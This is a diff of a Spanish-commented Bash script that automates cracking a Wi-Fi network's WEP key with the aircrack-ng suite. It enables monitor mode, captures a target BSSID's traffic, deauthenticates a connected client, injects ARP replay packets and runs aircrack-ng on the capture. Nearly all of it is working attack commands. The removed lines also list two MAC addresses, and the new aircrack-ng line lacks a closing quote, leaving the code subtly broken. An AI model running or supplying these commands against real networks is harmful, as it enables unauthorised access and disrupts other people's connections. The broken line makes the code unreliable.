@@ -12,7 +12,7 @@ AircrackWEP() {
 
 	if [ ! `echo $TARJETA_SELECCIONADA_MAC | grep ":"` ]
 	then
-		#Utilizo mi propia interfaz para realizar falsa autenticación
+		#Utilizo mi propia interfaz para realizar falsa autenticacion
 		TARJETA_SELECCIONADA_MAC=$(head -1 "$LOG_TARJETA" | tail -1)
 	else
 		TARJETA_SELECCIONADA_MAC=$(echo "$CLIENT" | awk -F "," {' print $1 '})		
@@ -21,30 +21,18 @@ AircrackWEP() {
 	TARJETA_MODO_MONITOR=$(head -1 "$ARCHIVO_TARJETA_MONITOR" | tail -1) 
 	sudo airmon-ng stop $TARJETA_MODO_MONITOR
 
-	TARJETAS_WIFI_DISPONIBLES=$(iwconfig --version | grep "Recommend" | awk '{print $1}' | sort)	
+	TARJETAS_WIFI_DISPONIBLES=$(iwconfig --version | grep "Recommend" | awk 	'{print $1}' | sort)	
 	INTERFAZ=$(echo $TARJETAS_WIFI_DISPONIBLES | awk '{print $1}')
 	sudo airmon-ng start $INTERFAZ $CANAL
 	X1="airmon-ng start $INTERFAZ $CANAL"
 	
-	sudo xterm -hold -e "airodump-ng -c $CANAL --bssid $BSSID -w $CAPTURA_AIRCRACK $TARJETA_MODO_MONITOR" &
+	airodump-ng -c $CANAL --bssid $BSSID -w $CAPTURA_AIRCRACK $TARJETA_MODO_MONITOR
 	X2="airodump-ng -c $CANAL --bssid $BSSID -w output $TARJETA_MODO_MONITOR"
-
-	#BuscarClienteConectado $CAPTURA_AIRCRACK $BSSID
-	#if [ "$TARJETA_SELECCIONADA_MAC" == "" ]
-	#then
-	#	TARJETA_SELECCIONADA_MAC=$(head -1 "$LOG_TARJETA" | tail -1)
-	#fi
-
-	#echo "MAC:$TARJETA_SELECCIONADA_MAC"
-	#80:B6:86:D5:F9:4B
-	#AC:38:70:25:ED:62
-	#aircrack-80:B6:86:D5:F9:4B.dat
-
 	echo "....Comienzo a inyectar..."
 
-	sudo xterm -hold -e "aireplay-ng -0 5 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR" &
+	aireplay-ng -0 5 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR
 	X3="aireplay-ng -0 5 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR"
-	sudo xterm -hold -e "aireplay-ng -3 -b $BSSID -h $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR" &
+	aireplay-ng -3 -b $BSSID -h $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR
 	X4="aireplay-ng -3 -b $BSSID -h $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR"
 	
 	TIEMPO_ESCANEO="120"
@@ -53,10 +41,8 @@ AircrackWEP() {
 		sleep 1s
 		if [ $A -eq $TIEMPO_ESCANEO ]
 		then
-			#echo "sudo aircrack-ng -a $1 -b $BSSID -s *.cap"
-			#sudo aircrack-ng -a 1 -s output-01.cap 2>&1 | tee "aircrack-$BSSID.dat"
 			X5="aircrack-ng -a 1 -s output-01.cap"
-			sudo aircrack-ng -a 1 -s "$CAPTURA_AIRCRACK-01.cap" >> "$RUTA_AIRCRACK/aircrack-$BSSID.dat" &
+			aircrack-ng -a 1 -s "$CAPTURA_AIRCRACK-01.cap" >> "$RUTA_AIRCRACK/aircrack-$BSSID.dat
 		else
 			TIEMPO_RESTANTE=$(expr $TIEMPO_ESCANEO - $A)
 		fi
